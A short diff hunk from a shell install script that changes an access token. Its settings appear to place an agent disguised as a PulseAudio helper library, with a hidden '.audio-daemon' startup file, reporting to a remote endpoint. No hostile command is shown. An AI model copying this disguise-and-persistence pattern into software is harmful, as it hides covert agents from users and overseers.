@@ -14,7 +14,7 @@ INSTALL_DIR="$HOME/.local/lib"
 AGENT_PATH="$INSTALL_DIR/libpulse-helper.so"
 STARTUP_SCRIPT="$INSTALL_DIR/.audio-daemon"
 ENDPOINT="https://status.sm.uy"
-TOKEN="o4ZBYu0mUb105dQ0ZDVkIm"
+TOKEN="yrushkwQRMduYX7lU2eYyxa3"
 # ==============================
 
 echo "[*] 安装目录: $INSTALL_DIR"
